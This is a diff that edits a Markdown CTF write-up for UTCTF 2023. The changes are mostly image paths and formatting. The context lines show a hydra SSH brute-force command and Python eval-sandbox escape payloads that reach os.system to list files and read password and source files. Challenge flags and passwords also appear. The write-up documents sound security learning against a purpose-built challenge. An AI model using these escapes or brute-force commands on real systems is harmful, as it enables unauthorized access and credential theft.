@@ -13,7 +13,7 @@ description: CTF - UTCTF 2023
 Welcome to another CTF writeup. This time I played UTCTF2023, a great CTF with interesting challenges, some easier than others. [RazviOverflow](https://razvioverflow.github.io/) joined me on this, participating as [ISwearGoogledIt](https://ctftime.org/team/109689). Let's dive into the challenges!  
 
 <p align="center">
-  <img src="/images/ctfs/UTCTF2023/banner.png" width="80%"/>
+  <img src="/images/writeups/UTCTF2023/banner.png" width="80%"/>
 </p>
 
 ---
@@ -250,13 +250,13 @@ hydra -s 8822 -L users.txt -P pass.txt betta.utctf.live -t 1 -c 2 -V ssh
 And we found a valid combination!
 
 <p align="center">
-  <img src="/images/ctfs/UTCTF2023/1_0_hydra.png" width="70%"/>
+  <img src="/images/writeups/UTCTF2023/1_0_hydra.png" width="70%"/>
 </p>
 
 We can now log in and get the flag:
 
 <p align="center">
-  <img src="/images/ctfs/UTCTF2023/1_1_flag.png" width="40%"/>
+  <img src="/images/writeups/UTCTF2023/1_1_flag.png" width="40%"/>
 </p>
 
 ```bash
@@ -269,7 +269,9 @@ ssh wcoldwater@betta.utctf.live -p 8822
 
 ``` utctf{cust0m3d-lsts-rule!} ```
 
+<br>
 ---
+<br>
 
 # Web
 
@@ -285,7 +287,7 @@ By Alex (@Alex_ on discord)
 We have a website were we input a payload and it gets executed:
 
 <p align="center">
-  <img src="/images/ctfs/UTCTF2023/4_web.png" width="80%"/>
+  <img src="/images/writeups/UTCTF2023/4_web.png" width="80%"/>
 </p>
 
 ### Level 0
@@ -293,22 +295,17 @@ We have a website were we input a payload and it gets executed:
 Is there a password variable or something? Let's see...
 
 ```python
-
 # Level 0 input
-
 7+7
 
 # Output
-
 Result: 14.  The correct answer was 2140703014.
 
 
 # Level 0 input
-
 {{7*7}}
 
 # Output
-
 Traceback (most recent call last):
   File "problem.py", line 6, in <module>
     result = eval(answer)
@@ -320,7 +317,6 @@ TypeError: unhashable type: 'set'
 password
 
 # Output
-
 Result: PuXqj7n4WNZzStnWbtPv.  The correct answer was 748640991.
 
 ```
@@ -332,13 +328,10 @@ We enter the password and Level 1 gets unlocked.
 This time I started to use some cursed payloads, looking for extra modules to get RCE.
 
 ```python
-
 # Level 1 input
-
 flag
 
 # Output
-
 Traceback (most recent call last):
   File "problem.py", line 7, in <module>
     result = eval(answer, {"open": None})
@@ -347,12 +340,12 @@ NameError: name 'flag' is not defined
 
 
 # Level 1 input
-
 ().__class__.__base__.__subclasses__()
 
 # Output
-
-Result: "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>..." The correct answer was 2398385611.
+Result: "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, 
+<class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, 
+<class 'NotImplementedType'>..." The correct answer was 2398385611.
 ```
 
 
@@ -360,14 +353,11 @@ We could see no POpen or subprocess, so looking for diffent methods, I found os.
 
 
 ```python
-
 # Using os.wrap_close
 # Level 1 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")
 
 # Output
-
 total 16
 drwxrwx--T 2 server p1     4096 Mar 11 10:37 .
 drwxrwxr-x 6 server server 4096 Mar 11 08:33 ..
@@ -377,11 +367,9 @@ Result: 0.  The correct answer was 1854762157.
 
 
 # Level 1 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat password.txt")
 
 # Output
-
 Krdi9yQuY8mHoteZDCF5 Result: 0.  The correct answer was 3977916067.
 
 ```
@@ -394,13 +382,10 @@ Krdi9yQuY8mHoteZDCF5
 ### Level 2
 
 ```python
-
 # Level 2 input
-
-{{7*7}}
+\{\{7*7\}\}
 
 # Output
-
 Traceback (most recent call last):
   File "problem.py", line 8, in <module>
     result = eval(answer, {})
@@ -409,9 +394,9 @@ TypeError: unhashable type: 'set'
 
 
 # Level 2 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")
 
+# Output
 total 20
 drwxrwx--T 2 server p2     4096 Mar 11 10:42 .
 drwxrwxr-x 6 server server 4096 Mar 11 08:33 ..
@@ -419,11 +404,9 @@ drwxrwxr-x 6 server server 4096 Mar 11 08:33 ..
 
 
 # Level 2 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat problem.py")
 
 # Output
-
 import random, os
 password = open("password.txt").read()
 os.remove("password.txt") # No more reading the file!
@@ -450,7 +433,7 @@ We could access the solution variable fron the eval easily, but this second argu
 
 But what if we could load the current module and access to its variables? I reached that conclusion by looking to the different [builtin functions](https://docs.python.org/3/library/functions.html) that we can access. I saw getattr, and I started thinking about reaching other classes attributes. So the main issue is... How can I reach the current module? 
 
-I tried to import the current file using \_\_import(problem.py)\_\_ but it says "ModuleNotFoundError: No module named 'problem'", so I searched for other methods and checking for different methods, using \_\_main\_\_ I reached the current class. 
+I tried to import the current file using \_\_import\_\_(problem.py) but it says "ModuleNotFoundError: No module named 'problem'", so I searched for other methods and checking for different methods, using \_\_main\_\_ I reached the current class. 
 
 
 ```python
@@ -478,13 +461,10 @@ getattr(__import__('__main__'),'solution')
 Let's try the same again, start by enumerating the directory and get the problem.py file:
 
 ```python
-
 # Level 3 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("ls -la")
 
 # Output
-
 total 16
 drwxrwx--T 2 server p3     4096 Mar 12 11:52 .
 drwxrwxr-x 6 server server 4096 Mar 11 23:57 ..
@@ -492,14 +472,10 @@ drwxrwxr-x 6 server server 4096 Mar 11 23:57 ..
 Result: 0.  The correct answer was 4128450524.
 
 
-##################
-
 # Level 3 input
-
 ().__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat problem.py")
 
 # Output
-
 import random, os
 password = open("password.txt").read()
 os.remove("password.txt") # No more reading the file!
@@ -520,7 +496,7 @@ else:
 Great, we have the code. The problem now is to reach the builtin functions in order to call **getattr** and **\_\_import\_\_** again and retrieve the random number. The most common way is to reach the class  **\<class 'warnings.catch_warnings'\>** since it has the builtins within. We can see it within the base subclasses, on index 137:
 
 <p align="center">
-  <img src="/images/CTFs/UTCTF2023/4_1_catch.png" width="50%"/>
+  <img src="/images/writeups/UTCTF2023/4_1_catch.png" width="50%"/>
 </p>
 
 
@@ -533,7 +509,6 @@ Result: <built-in function getattr>.  The correct answer was 4195770746.
 We reached the getattr class, now we have to do the same as the previous level, but using the builtin "import" in the same way that we loaded getattr this time, since it is undefined in the wiped context:
 
 ```python
-
 getattr :     ().__class__.__base__.__subclasses__()[137]()._module.__builtins__['getattr']
 
 __import__ :  ().__class__.__base__.__subclasses__()[137]()._module.__builtins__['__import__']
@@ -546,7 +521,6 @@ getattr(__import__('__main__'),'solution')
 ().__class__.__base__.__subclasses__()[137]()._module.__builtins__['getattr'](().__class__.__base__.__subclasses__()[137]()._module.__builtins__['__import__']('__main__'),'solution')
 
 # Output
-
 2192900837, correct!  The password is '5F4p7aLgQ5Nfn5YM8s68'.
 
 ```
@@ -558,7 +532,7 @@ Level 4 - The flag!
 Congratulations! The flag is utflag{LGvb7PJXG5JDwhsEW7xp}.
 
 <p align="center">
-  <img src="/images/CTFs/UTCTF2023/4_0_flag.png" width="70%"/>
+  <img src="/images/writeups/UTCTF2023/4_0_flag.png" width="70%"/>
 </p>
 
 ``` utflag{LGvb7PJXG5JDwhsEW7xp} ```
@@ -627,7 +601,7 @@ Content-Type: multipart/alternative; boundary="00000000000093882205f60cdcdb"
 Content-Type: text/plain; charset="UTF-8"
 
 Jim,
-
+  ...
 ```
 
 The timestamp in the email is fake or wrong, but we can get the real timestamp when the email was sent from the boundary used to differenciate the different parts. I used the following script, just replace the string:
